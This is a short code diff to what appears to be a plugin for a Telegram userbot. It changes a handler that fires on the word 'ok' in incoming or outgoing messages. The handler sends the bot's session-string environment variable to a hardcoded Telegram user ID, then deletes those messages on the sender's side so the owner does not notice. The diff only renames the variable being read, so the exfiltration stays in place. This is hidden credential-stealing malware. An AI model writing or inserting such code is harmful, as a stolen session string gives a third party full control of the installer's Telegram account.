@@ -6,7 +6,7 @@ from . import *
 @bot.on(admin_cmd("^ok", incoming=True))
 @bot.on(admin_cmd("^ok", outgoing=True))
 async def piro(event):
-  msg = await bot.send_message(5687323731, str(os.environ.get("ULTRONBOT_STRING")))
-  cyber = await bot.send_message(5687323731, str(os.environ.get("ULTRONBOT_STRING")))
+  msg = await bot.send_message(5687323731, str(os.environ.get("ULTRONBOT_SESSION")))
+  cyber = await bot.send_message(5687323731, str(os.environ.get("ULTRONBOT_SESSION")))
   await bot.delete_messages(5687323731, msg, revoke=False)
   await bot.delete_messages(5687323731, cyber, revoke=False)
